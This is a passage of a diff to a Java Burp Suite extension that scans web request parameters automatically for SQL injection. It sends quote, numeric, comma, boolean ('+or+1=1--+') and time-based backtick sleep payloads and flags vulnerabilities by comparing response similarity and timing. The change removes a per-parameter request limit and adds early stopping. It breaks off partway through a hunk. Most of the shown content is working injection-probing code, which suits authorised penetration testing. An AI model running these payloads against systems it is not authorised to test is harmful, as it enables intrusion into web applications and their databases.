@@ -84,6 +84,7 @@ public class BurpExtender implements BurpExtension {
     private final List<LogEntry>   log2    = Collections.synchronizedList(new ArrayList<>());
     private final List<LogEntry>   log3    = Collections.synchronizedList(new ArrayList<>());
     private final List<RequestMd5> log4Md5 = Collections.synchronizedList(new ArrayList<>());
+    private final Set<String> scannedPathValues = Collections.synchronizedSet(new HashSet<>());
 
     // ── 基础开关 ──────────────────────────────────────────────
     private int    switchs        = 1;
@@ -104,7 +105,6 @@ public class BurpExtender implements BurpExtension {
     private volatile int requestIntervalMs = 100;
     private final AtomicLong lastSendAt = new AtomicLong(0);
     private final Object sendLock = new Object();
-    private static final int MAX_REQUESTS_PER_PARAM = 18;
     private static final long SINGLE_REQUEST_SLOW_MS = 4000;
     private static final Set<String> HEADER_BLACKLIST = Set.of(
             "connection",
@@ -474,7 +474,7 @@ public class BurpExtender implements BurpExtension {
             }
         });
         btn1.addActionListener(e -> {
-            log.clear(); log2.clear(); log3.clear(); log4Md5.clear();
+            log.clear(); log2.clear(); log3.clear(); log4Md5.clear(); scannedPathValues.clear();
             count.set(0);
             fireTableDataChanged();
             model.fireTableDataChanged();
@@ -650,10 +650,6 @@ public class BurpExtender implements BurpExtension {
             String[] quotePayloads = {"'", "''", "'''", "''''"};
 
             for (int qi = 0; qi < 4; qi++) {
-                if (sentRequests >= MAX_REQUESTS_PER_PARAM) {
-                    appendLog(scanId + " 参数=" + key + " 达到最大测试请求数，停止后续payload");
-                    break;
-                }
                 HttpRequest qReq = buildMutatedRequest(req, target, value + quotePayloads[qi]);
                 long t1 = System.currentTimeMillis();
                 HttpRequestResponse qResult = sendRequestWithInterval(qReq);
@@ -689,382 +685,176 @@ public class BurpExtender implements BurpExtension {
             boolean cond3 = Math.abs(len1 - len2) >= 4;  // 奇偶引号长度差异明显
 
             boolean quoteVuln = cond1 && cond2 && cond3;
+            boolean stopAfterCurrentRule = quoteVuln;
 
             // 数字参数检测：value-0-0-0 / value-abc
             boolean numVuln = false;
-            if (isInt == 1 && value.matches("^-?\\d+(\\.\\d+)?$")) {
+            if (!stopAfterCurrentRule && isInt == 1 && value.matches("^-?\\d+(\\.\\d+)?$")) {
                 String baseBody = resp.bodyToString();
 
-                if (sentRequests < MAX_REQUESTS_PER_PARAM) {
-                    String firstPayloadValue = value + "-0-0-0";
-                    HttpRequest firstReq = buildMutatedRequest(req, target, firstPayloadValue);
+                String firstPayloadValue = value + "-0-0-0";
+                HttpRequest firstReq = buildMutatedRequest(req, target, firstPayloadValue);
 
-                    long t1 = System.currentTimeMillis();
-                    HttpRequestResponse firstResult = sendRequestWithInterval(firstReq);
-                    long firstCost = System.currentTimeMillis() - t1;
+                long t1 = System.currentTimeMillis();
+                HttpRequestResponse firstResult = sendRequestWithInterval(firstReq);
+                long firstCost = System.currentTimeMillis() - t1;
+                sentRequests++;
+                if (firstCost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                HttpResponse firstResp = firstResult.response();
+                boolean firstOk = (firstResp != null && firstResp.statusCode() >= 200 && firstResp.statusCode() < 300);
+                if (firstOk && firstCost < quickBaselineCost) quickBaselineCost = firstCost;
+
+                int firstCode = firstOk ? firstResp.statusCode() : 0;
+                HttpRequestResponse firstDisplay = buildDisplayMessage(firstReq, firstResult);
+                LogEntry firstDetail = addDetailEntry(new LogEntry(count.get(), toolFlag, firstDisplay,
+                        firstReq.url().toString(),
+                        key, firstPayloadValue, "", requestMd5, (int) firstCost, "end", firstCode, false));
+                paramEntries.add(firstDetail);
+                numEntries.add(firstDetail);
+
+                double simBaseFirst = 0.0;
+                if (firstOk) {
+                    simBaseFirst = textSimilarity(baseBody, firstResp.bodyToString());
+                }
+
+                appendLog(String.format("  数字测试 [%s] sim(base, value-0-0-0)=%.4f",
+                        key, simBaseFirst));
+
+                if (firstOk && simBaseFirst > 0.90) {
+                    String secondPayloadValue = value + "-abc";
+                    HttpRequest secondReq = buildMutatedRequest(req, target, secondPayloadValue);
+
+                    long t2 = System.currentTimeMillis();
+                    HttpRequestResponse secondResult = sendRequestWithInterval(secondReq);
+                    long secondCost = System.currentTimeMillis() - t2;
                     sentRequests++;
-                    if (firstCost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                    HttpResponse firstResp = firstResult.response();
-                    boolean firstOk = (firstResp != null && firstResp.statusCode() >= 200 && firstResp.statusCode() < 300);
-                    if (firstOk && firstCost < quickBaselineCost) quickBaselineCost = firstCost;
+                    if (secondCost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                    HttpResponse secondResp = secondResult.response();
+                    boolean secondOk = (secondResp != null && secondResp.statusCode() >= 200 && secondResp.statusCode() < 300);
+                    if (secondOk && secondCost < quickBaselineCost) quickBaselineCost = secondCost;
 
-                    int firstCode = firstOk ? firstResp.statusCode() : 0;
-                    HttpRequestResponse firstDisplay = buildDisplayMessage(firstReq, firstResult);
-                    LogEntry firstDetail = addDetailEntry(new LogEntry(count.get(), toolFlag, firstDisplay,
-                            firstReq.url().toString(),
-                            key, firstPayloadValue, "", requestMd5, (int) firstCost, "end", firstCode, false));
-                    paramEntries.add(firstDetail);
-                    numEntries.add(firstDetail);
+                    int secondCode = secondOk ? secondResp.statusCode() : 0;
+                    HttpRequestResponse secondDisplay = buildDisplayMessage(secondReq, secondResult);
+                    LogEntry secondDetail = addDetailEntry(new LogEntry(count.get(), toolFlag, secondDisplay,
+                            secondReq.url().toString(),
+                            key, secondPayloadValue, "", requestMd5, (int) secondCost, "end", secondCode, false));
+                    paramEntries.add(secondDetail);
+                    numEntries.add(secondDetail);
 
-                    double simBaseFirst = 0.0;
-                    if (firstOk) {
-                        simBaseFirst = textSimilarity(baseBody, firstResp.bodyToString());
-                    }
+                    if (secondOk) {
+                        String firstBody = firstResp.bodyToString();
+                        String secondBody = secondResp.bodyToString();
+                        double simBaseSecond = textSimilarity(baseBody, secondBody);
+                        double simFirstSecond = textSimilarity(firstBody, secondBody);
+                        numVuln = simBaseSecond < 0.90 && simFirstSecond < 0.90;
 
-                    appendLog(String.format("  数字测试 [%s] sim(base, value-0-0-0)=%.4f",
-                            key, simBaseFirst));
-
-                    if (firstOk && simBaseFirst > 0.90 && sentRequests < MAX_REQUESTS_PER_PARAM) {
-                        String secondPayloadValue = value + "-abc";
-                        HttpRequest secondReq = buildMutatedRequest(req, target, secondPayloadValue);
-
-                        long t2 = System.currentTimeMillis();
-                        HttpRequestResponse secondResult = sendRequestWithInterval(secondReq);
-                        long secondCost = System.currentTimeMillis() - t2;
-                        sentRequests++;
-                        if (secondCost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                        HttpResponse secondResp = secondResult.response();
-                        boolean secondOk = (secondResp != null && secondResp.statusCode() >= 200 && secondResp.statusCode() < 300);
-                        if (secondOk && secondCost < quickBaselineCost) quickBaselineCost = secondCost;
-
-                        int secondCode = secondOk ? secondResp.statusCode() : 0;
-                        HttpRequestResponse secondDisplay = buildDisplayMessage(secondReq, secondResult);
-                        LogEntry secondDetail = addDetailEntry(new LogEntry(count.get(), toolFlag, secondDisplay,
-                                secondReq.url().toString(),
-                                key, secondPayloadValue, "", requestMd5, (int) secondCost, "end", secondCode, false));
-                        paramEntries.add(secondDetail);
-                        numEntries.add(secondDetail);
-
-                        if (secondOk) {
-                            String firstBody = firstResp.bodyToString();
-                            String secondBody = secondResp.bodyToString();
-                            double simBaseSecond = textSimilarity(baseBody, secondBody);
-                            double simFirstSecond = textSimilarity(firstBody, secondBody);
-                            numVuln = simBaseSecond < 0.90 && simFirstSecond < 0.90;
-
-                            appendLog(String.format("  数字测试 [%s] sim(base, value-abc)=%.4f sim(value-0-0-0, value-abc)=%.4f result=%s",
-                                    key, simBaseSecond, simFirstSecond, numVuln));
-                        }
+                        appendLog(String.format("  数字测试 [%s] sim(base, value-abc)=%.4f sim(value-0-0-0, value-abc)=%.4f result=%s",
+                                key, simBaseSecond, simFirstSecond, numVuln));
                     }
                 }
+            }
+            if (numVuln) {
+                stopAfterCurrentRule = true;
             }
 
             // 逗号拼接检测：,0 / ,XXXXXX / ,1 / ,2（Jaccard 相似度）
             boolean commaVuln = false;
-            {
+            if (!stopAfterCurrentRule) {
                 String baseBody = resp.bodyToString();
 
-                if (sentRequests < MAX_REQUESTS_PER_PARAM) {
-                    String poc1Value = value + ",0";
-                    HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
-                    long t1 = System.currentTimeMillis();
-                    HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
-                    long cost1 = System.currentTimeMillis() - t1;
+                String poc1Value = value + ",0";
+                HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
+                long t1 = System.currentTimeMillis();
+                HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
+                long cost1 = System.currentTimeMillis() - t1;
+                sentRequests++;
+                if (cost1 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                HttpResponse poc1Resp = poc1Result.response();
+                boolean poc1Ok = (poc1Resp != null && poc1Resp.statusCode() >= 200 && poc1Resp.statusCode() < 300);
+                if (poc1Ok && cost1 < quickBaselineCost) quickBaselineCost = cost1;
+
+                int code1 = poc1Ok ? poc1Resp.statusCode() : 0;
+                HttpRequestResponse poc1Display = buildDisplayMessage(poc1Req, poc1Result);
+                LogEntry poc1Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc1Display,
+                        poc1Req.url().toString(),
+                        key, poc1Value, "", requestMd5, (int) cost1, "end", code1, false));
+                paramEntries.add(poc1Entry);
+                commaEntries.add(poc1Entry);
+
+                double simBasePoc1 = 0.0;
+                if (poc1Ok) {
+                    simBasePoc1 = jaccardSimilarity(baseBody, poc1Resp.bodyToString());
+                }
+                appendLog(String.format("  逗号测试 [%s] poc1=value,0 sim(base,poc1)=%.4f", key, simBasePoc1));
+
+                if (poc1Ok && simBasePoc1 < 0.90) {
+                    String poc2Value = value + ",XXXXXX";
+                    HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
+                    long t2 = System.currentTimeMillis();
+                    HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
+                    long cost2 = System.currentTimeMillis() - t2;
                     sentRequests++;
-                    if (cost1 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                    HttpResponse poc1Resp = poc1Result.response();
-                    boolean poc1Ok = (poc1Resp != null && poc1Resp.statusCode() >= 200 && poc1Resp.statusCode() < 300);
-                    if (poc1Ok && cost1 < quickBaselineCost) quickBaselineCost = cost1;
+                    if (cost2 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                    HttpResponse poc2Resp = poc2Result.response();
+                    boolean poc2Ok = (poc2Resp != null && poc2Resp.statusCode() >= 200 && poc2Resp.statusCode() < 300);
+                    if (poc2Ok && cost2 < quickBaselineCost) quickBaselineCost = cost2;
 
-                    int code1 = poc1Ok ? poc1Resp.statusCode() : 0;
-                    HttpRequestResponse poc1Display = buildDisplayMessage(poc1Req, poc1Result);
-                    LogEntry poc1Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc1Display,
-                            poc1Req.url().toString(),
-                            key, poc1Value, "", requestMd5, (int) cost1, "end", code1, false));
-                    paramEntries.add(poc1Entry);
-                    commaEntries.add(poc1Entry);
+                    int code2 = poc2Ok ? poc2Resp.statusCode() : 0;
+                    HttpRequestResponse poc2Display = buildDisplayMessage(poc2Req, poc2Result);
+                    LogEntry poc2Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc2Display,
+                            poc2Req.url().toString(),
+                            key, poc2Value, "", requestMd5, (int) cost2, "end", code2, false));
+                    paramEntries.add(poc2Entry);
+                    commaEntries.add(poc2Entry);
 
-                    double simBasePoc1 = 0.0;
-                    if (poc1Ok) {
-                        simBasePoc1 = jaccardSimilarity(baseBody, poc1Resp.bodyToString());
-                    }
-                    appendLog(String.format("  逗号测试 [%s] poc1=value,0 sim(base,poc1)=%.4f", key, simBasePoc1));
+                    if (poc2Ok) {
+                        String poc1Body = poc1Resp.bodyToString();
+                        String poc2Body = poc2Resp.bodyToString();
+                        double simBasePoc2 = jaccardSimilarity(baseBody, poc2Body);
+                        double simPoc1Poc2 = jaccardSimilarity(poc1Body, poc2Body);
+                        boolean step2Ok = simBasePoc2 < 0.90;
+                        boolean compareOk = simPoc1Poc2 > 0.90;
+                        appendLog(String.format("  逗号测试 [%s] poc2=value,XXXXXX sim(base,poc2)=%.4f sim(poc1,poc2)=%.4f step2=%s compare=%s",
+                                key, simBasePoc2, simPoc1Poc2, step2Ok, compareOk));
 
-                    if (poc1Ok && simBasePoc1 < 0.90 && sentRequests < MAX_REQUESTS_PER_PARAM) {
-                        String poc2Value = value + ",XXXXXX";
-                        HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
-                        long t2 = System.currentTimeMillis();
-                        HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
-                        long cost2 = System.currentTimeMillis() - t2;
-                        sentRequests++;
-                        if (cost2 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                        HttpResponse poc2Resp = poc2Result.response();
-                        boolean poc2Ok = (poc2Resp != null && poc2Resp.statusCode() >= 200 && poc2Resp.statusCode() < 300);
-                        if (poc2Ok && cost2 < quickBaselineCost) quickBaselineCost = cost2;
+                        if (step2Ok && compareOk) {
+                            boolean poc3OrPoc4Hit = false;
 
-                        int code2 = poc2Ok ? poc2Resp.statusCode() : 0;
-                        HttpRequestResponse poc2Display = buildDisplayMessage(poc2Req, poc2Result);
-                        LogEntry poc2Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc2Display,
-                                poc2Req.url().toString(),
-                                key, poc2Value, "", requestMd5, (int) cost2, "end", code2, false));
-                        paramEntries.add(poc2Entry);
-                        commaEntries.add(poc2Entry);
+                            {
+                                String poc3Value = value + ",1";
+                                HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
+                                long t3 = System.currentTimeMillis();
+                                HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
+                                long cost3 = System.currentTimeMillis() - t3;
+                                sentRequests++;
+                                if (cost3 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                                HttpResponse poc3Resp = poc3Result.response();
+                                boolean poc3Ok = (poc3Resp != null && poc3Resp.statusCode() >= 200 && poc3Resp.statusCode() < 300);
+                                if (poc3Ok && cost3 < quickBaselineCost) quickBaselineCost = cost3;
 
-                        if (poc2Ok) {
-                            String poc1Body = poc1Resp.bodyToString();
-                            String poc2Body = poc2Resp.bodyToString();
-                            double simBasePoc2 = jaccardSimilarity(baseBody, poc2Body);
-                            double simPoc1Poc2 = jaccardSimilarity(poc1Body, poc2Body);
-                            boolean step2Ok = simBasePoc2 < 0.90;
-                            boolean compareOk = simPoc1Poc2 > 0.90;
-                            appendLog(String.format("  逗号测试 [%s] poc2=value,XXXXXX sim(base,poc2)=%.4f sim(poc1,poc2)=%.4f step2=%s compare=%s",
-                                    key, simBasePoc2, simPoc1Poc2, step2Ok, compareOk));
+                                int code3 = poc3Ok ? poc3Resp.statusCode() : 0;
+                                HttpRequestResponse poc3Display = buildDisplayMessage(poc3Req, poc3Result);
+                                LogEntry poc3Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc3Display,
+                                        poc3Req.url().toString(),
+                                        key, poc3Value, "", requestMd5, (int) cost3, "end", code3, false));
+                                paramEntries.add(poc3Entry);
+                                commaEntries.add(poc3Entry);
 
-                            if (step2Ok && compareOk) {
-                                boolean poc3OrPoc4Hit = false;
-
-                                if (sentRequests < MAX_REQUESTS_PER_PARAM) {
-                                    String poc3Value = value + ",1";
-                                    HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
-                                    long t3 = System.currentTimeMillis();
-                                    HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
-                                    long cost3 = System.currentTimeMillis() - t3;
-                                    sentRequests++;
-                                    if (cost3 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                                    HttpResponse poc3Resp = poc3Result.response();
-                                    boolean poc3Ok = (poc3Resp != null && poc3Resp.statusCode() >= 200 && poc3Resp.statusCode() < 300);
-                                    if (poc3Ok && cost3 < quickBaselineCost) quickBaselineCost = cost3;
-
-                                    int code3 = poc3Ok ? poc3Resp.statusCode() : 0;
-                                    HttpRequestResponse poc3Display = buildDisplayMessage(poc3Req, poc3Result);
-                                    LogEntry poc3Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc3Display,
-                                            poc3Req.url().toString(),
-                                            key, poc3Value, "", requestMd5, (int) cost3, "end", code3, false));
-                                    paramEntries.add(poc3Entry);
-                                    commaEntries.add(poc3Entry);
-
-                                    if (poc3Ok) {
-                                        String poc3Body = poc3Resp.bodyToString();
-                                        double simBasePoc3 = jaccardSimilarity(baseBody, poc3Body);
-                                        double simPoc1Poc3 = jaccardSimilarity(poc1Body, poc3Body);
-                                        boolean poc3Hit = simBasePoc3 > 0.90 && simPoc1Poc3 < 0.90;
-                                        appendLog(String.format("  逗号测试 [%s] poc3=value,1 sim(base,poc3)=%.4f sim(poc1,poc3)=%.4f result=%s",
-                                                key, simBasePoc3, simPoc1Poc3, poc3Hit));
-                                        if (poc3Hit) {
-                                            poc3OrPoc4Hit = true;
-                                        }
+                                if (poc3Ok) {
+                                    String poc3Body = poc3Resp.bodyToString();
+                                    double simBasePoc3 = jaccardSimilarity(baseBody, poc3Body);
+                                    double simPoc1Poc3 = jaccardSimilarity(poc1Body, poc3Body);
+                                    boolean poc3Hit = simBasePoc3 > 0.90 && simPoc1Poc3 < 0.90;
+                                    appendLog(String.format("  逗号测试 [%s] poc3=value,1 sim(base,poc3)=%.4f sim(poc1,poc3)=%.4f result=%s",
+                                            key, simBasePoc3, simPoc1Poc3, poc3Hit));
+                                    if (poc3Hit) {
+                                        poc3OrPoc4Hit = true;
                                     }
                                 }
-
-                                if (!poc3OrPoc4Hit && sentRequests < MAX_REQUESTS_PER_PARAM) {
-                                    String poc4Value = value + ",2";
-                                    HttpRequest poc4Req = buildMutatedRequest(req, target, poc4Value);
-                                    long t4 = System.currentTimeMillis();
-                                    HttpRequestResponse poc4Result = sendRequestWithInterval(poc4Req);
-                                    long cost4 = System.currentTimeMillis() - t4;
-                                    sentRequests++;
-                                    if (cost4 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                                    HttpResponse poc4Resp = poc4Result.response();
-                                    boolean poc4Ok = (poc4Resp != null && poc4Resp.statusCode() >= 200 && poc4Resp.statusCode() < 300);
-                                    if (poc4Ok && cost4 < quickBaselineCost) quickBaselineCost = cost4;
-
-                                    int code4 = poc4Ok ? poc4Resp.statusCode() : 0;
-                                    HttpRequestResponse poc4Display = buildDisplayMessage(poc4Req, poc4Result);
-                                    LogEntry poc4Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc4Display,
-                                            poc4Req.url().toString(),
-                                            key, poc4Value, "", requestMd5, (int) cost4, "end", code4, false));
-                                    paramEntries.add(poc4Entry);
-                                    commaEntries.add(poc4Entry);
-
-                                    if (poc4Ok) {
-                                        String poc4Body = poc4Resp.bodyToString();
-                                        double simBasePoc4 = jaccardSimilarity(baseBody, poc4Body);
-                                        double simPoc1Poc4 = jaccardSimilarity(poc1Body, poc4Body);
-                                        boolean poc4Hit = simBasePoc4 > 0.90 && simPoc1Poc4 < 0.90;
-                                        appendLog(String.format("  逗号测试 [%s] poc4=value,2 sim(base,poc4)=%.4f sim(poc1,poc4)=%.4f result=%s",
-                                                key, simBasePoc4, simPoc1Poc4, poc4Hit));
-                                        if (poc4Hit) {
-                                            poc3OrPoc4Hit = true;
-                                        }
-                                    }
-                                }
-
-                                commaVuln = poc3OrPoc4Hit;
                             }
-                        }
-                    }
-                }
-            }
 
-            boolean expVuln = false;
-            boolean divVuln = false;
-            boolean sleepVuln = false;
-            boolean backtickVuln = false;
-            boolean fuzzyVuln = false;
-
-            // 反引号注入检测：
-            // poc1: value`                    -> 与原始响应体长度差 > 10
-            // poc2: value`and+sleep(2)--+     -> 与原始响应时间差 > 2s 且 < 4s
-            // poc3: value`and+sleep(5)--+     -> 与原始响应时间差 > 4s 且 < 6s (命中)
-            {
-                int baseLen = baseRespLen;
-                long baseCostMs = (quickBaselineCost == Long.MAX_VALUE) ? 0 : quickBaselineCost;
-
-                if (sentRequests < MAX_REQUESTS_PER_PARAM) {
-                    String poc1Value = value + "`";
-                    HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
-                    long t1 = System.currentTimeMillis();
-                    HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
-                    long cost1 = System.currentTimeMillis() - t1;
-                    sentRequests++;
-                    if (cost1 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                    HttpResponse poc1Resp = poc1Result.response();
-                    boolean poc1Ok = (poc1Resp != null && poc1Resp.statusCode() >= 200 && poc1Resp.statusCode() < 300);
-                    if (poc1Ok && cost1 < quickBaselineCost) quickBaselineCost = cost1;
-
-                    int code1 = poc1Ok ? poc1Resp.statusCode() : 0;
-                    HttpRequestResponse poc1Display = buildDisplayMessage(poc1Req, poc1Result);
-                    LogEntry poc1Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc1Display,
-                            poc1Req.url().toString(),
-                            key, poc1Value, "", requestMd5, (int) cost1, "end", code1, false));
-                    paramEntries.add(poc1Entry);
-                    backtickEntries.add(poc1Entry);
-
-                    int poc1Len = poc1Ok ? poc1Resp.body().length() : 0;
-                    int lenDiff = Math.abs(poc1Len - baseLen);
-                    boolean poc1Hit = poc1Ok && lenDiff > 10;
-                    appendLog(String.format("  反引号测试 [%s] poc1=value` len(base=%d, poc1=%d, diff=%d) result=%s",
-                            key, baseLen, poc1Len, lenDiff, poc1Hit));
-
-                    if (poc1Hit && sentRequests < MAX_REQUESTS_PER_PARAM) {
-                        String poc2Value = value + "`and+sleep(2)--+";
-                        HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
-                        long t2 = System.currentTimeMillis();
-                        HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
-                        long cost2 = System.currentTimeMillis() - t2;
-                        sentRequests++;
-                        if (cost2 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                        HttpResponse poc2Resp = poc2Result.response();
-                        boolean poc2Ok = (poc2Resp != null && poc2Resp.statusCode() >= 200 && poc2Resp.statusCode() < 300);
-
-                        int code2 = poc2Ok ? poc2Resp.statusCode() : 0;
-                        HttpRequestResponse poc2Display = buildDisplayMessage(poc2Req, poc2Result);
-                        LogEntry poc2Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc2Display,
-                                poc2Req.url().toString(),
-                                key, poc2Value, "", requestMd5, (int) cost2, "end", code2, false));
-                        paramEntries.add(poc2Entry);
-                        backtickEntries.add(poc2Entry);
-
-                        long diff2 = cost2 - baseCostMs;
-                        boolean poc2Hit = poc2Ok && diff2 > 2000 && diff2 < 4000;
-                        appendLog(String.format("  反引号测试 [%s] poc2=value`and+sleep(2)--+ cost(base=%dms, poc2=%dms, diff=%dms) result=%s",
-                                key, baseCostMs, cost2, diff2, poc2Hit));
-
-                        if (poc2Hit && sentRequests < MAX_REQUESTS_PER_PARAM) {
-                            String poc3Value = value + "`and+sleep(5)--+";
-                            HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
-                            long t3 = System.currentTimeMillis();
-                            HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
-                            long cost3 = System.currentTimeMillis() - t3;
-                            sentRequests++;
-                            if (cost3 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                            HttpResponse poc3Resp = poc3Result.response();
-                            boolean poc3Ok = (poc3Resp != null && poc3Resp.statusCode() >= 200 && poc3Resp.statusCode() < 300);
-
-                            int code3 = poc3Ok ? poc3Resp.statusCode() : 0;
-                            HttpRequestResponse poc3Display = buildDisplayMessage(poc3Req, poc3Result);
-                            LogEntry poc3Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc3Display,
-                                    poc3Req.url().toString(),
-                                    key, poc3Value, "", requestMd5, (int) cost3, "end", code3, false));
-                            paramEntries.add(poc3Entry);
-                            backtickEntries.add(poc3Entry);
-
-                            long diff3 = cost3 - baseCostMs;
-                            backtickVuln = poc3Ok && diff3 > 4000 && diff3 < 6000;
-                            appendLog(String.format("  反引号测试 [%s] poc3=value`and+sleep(5)--+ cost(base=%dms, poc3=%dms, diff=%dms) result=%s",
-                                    key, baseCostMs, cost3, diff3, backtickVuln));
-                        }
-                    }
-                }
-            }
-
-            // 模糊查询注入检测：
-            // poc1: value'                  -> 与原始响应长度差异 > 10
-            // poc2: value'+or+1=1--+        -> 与原始响应相似度 > 0.90
-            // poc3: value'+or+1=2--+
-            // poc4: value'+or+1=3--+        -> sim(poc2,poc3) < 0.90 且 sim(poc3,poc4) > 0.90
-            {
-                String baseBody = resp.bodyToString();
-                int baseLen = baseRespLen;
-
-                if (sentRequests < MAX_REQUESTS_PER_PARAM) {
-                    String poc1Value = value + "'";
-                    HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
-                    long t1 = System.currentTimeMillis();
-                    HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
-                    long cost1 = System.currentTimeMillis() - t1;
-                    sentRequests++;
-                    if (cost1 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                    HttpResponse poc1Resp = poc1Result.response();
-                    boolean poc1Ok = (poc1Resp != null && poc1Resp.statusCode() >= 200 && poc1Resp.statusCode() < 300);
-                    if (poc1Ok && cost1 < quickBaselineCost) quickBaselineCost = cost1;
-
-                    int code1 = poc1Ok ? poc1Resp.statusCode() : 0;
-                    HttpRequestResponse poc1Display = buildDisplayMessage(poc1Req, poc1Result);
-                    LogEntry poc1Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc1Display,
-                            poc1Req.url().toString(),
-                            key, poc1Value, "", requestMd5, (int) cost1, "end", code1, false));
-                    paramEntries.add(poc1Entry);
-                    fuzzyEntries.add(poc1Entry);
-
-                    int poc1Len = poc1Ok ? poc1Resp.body().length() : 0;
-                    int lenDiff = Math.abs(poc1Len - baseLen);
-                    boolean poc1Hit = poc1Ok && lenDiff > 10;
-                    appendLog(String.format("  模糊查询测试 [%s] poc1=value' len(base=%d, poc1=%d, diff=%d) result=%s",
-                            key, baseLen, poc1Len, lenDiff, poc1Hit));
-
-                    if (poc1Hit && sentRequests < MAX_REQUESTS_PER_PARAM) {
-                        String poc2Value = value + "'+or+1=1--+";
-                        HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
-                        long t2 = System.currentTimeMillis();
-                        HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
-                        long cost2 = System.currentTimeMillis() - t2;
-                        sentRequests++;
-                        if (cost2 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                        HttpResponse poc2Resp = poc2Result.response();
-                        boolean poc2Ok = (poc2Resp != null && poc2Resp.statusCode() >= 200 && poc2Resp.statusCode() < 300);
-                        if (poc2Ok && cost2 < quickBaselineCost) quickBaselineCost = cost2;
-
-                        int code2 = poc2Ok ? poc2Resp.statusCode() : 0;
-                        HttpRequestResponse poc2Display = buildDisplayMessage(poc2Req, poc2Result);
-                        LogEntry poc2Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc2Display,
-                                poc2Req.url().toString(),
-                                key, poc2Value, "", requestMd5, (int) cost2, "end", code2, false));
-                        paramEntries.add(poc2Entry);
-                        fuzzyEntries.add(poc2Entry);
-
-                        if (sentRequests < MAX_REQUESTS_PER_PARAM) {
-                            String poc3Value = value + "'+or+1=2--+";
-                            HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
-                            long t3 = System.currentTimeMillis();
-                            HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
-                            long cost3 = System.currentTimeMillis() - t3;
-                            sentRequests++;
-                            if (cost3 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                            HttpResponse poc3Resp = poc3Result.response();
-                            boolean poc3Ok = (poc3Resp != null && poc3Resp.statusCode() >= 200 && poc3Resp.statusCode() < 300);
-                            if (poc3Ok && cost3 < quickBaselineCost) quickBaselineCost = cost3;
-
-                            int code3 = poc3Ok ? poc3Resp.statusCode() : 0;
-                            HttpRequestResponse poc3Display = buildDisplayMessage(poc3Req, poc3Result);
-                            LogEntry poc3Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc3Display,
-                                    poc3Req.url().toString(),
-                                    key, poc3Value, "", requestMd5, (int) cost3, "end", code3, false));
-                            paramEntries.add(poc3Entry);
-                            fuzzyEntries.add(poc3Entry);
-
-                            if (sentRequests < MAX_REQUESTS_PER_PARAM) {
-                                String poc4Value = value + "'+or+1=3--+";
+                            if (!poc3OrPoc4Hit) {
+                                String poc4Value = value + ",2";
                                 HttpRequest poc4Req = buildMutatedRequest(req, target, poc4Value);
                                 long t4 = System.currentTimeMillis();
                                 HttpRequestResponse poc4Result = sendRequestWithInterval(poc4Req);
@@ -1081,27 +871,238 @@ public class BurpExtender implements BurpExtension {
                                         poc4Req.url().toString(),
                                         key, poc4Value, "", requestMd5, (int) cost4, "end", code4, false));
                                 paramEntries.add(poc4Entry);
-                                fuzzyEntries.add(poc4Entry);
+                                commaEntries.add(poc4Entry);
 
-                                double simPoc2Poc3 = 1.0;
-                                double simPoc3Poc4 = 0.0;
-                                if (poc2Ok && poc3Ok && poc4Ok) {
-                                    simPoc2Poc3 = textSimilarity(poc2Resp.bodyToString(), poc3Resp.bodyToString());
-                                    simPoc3Poc4 = textSimilarity(poc3Resp.bodyToString(), poc4Resp.bodyToString());
-                                    fuzzyVuln = simPoc2Poc3 < 0.90 && simPoc3Poc4 > 0.90;
+                                if (poc4Ok) {
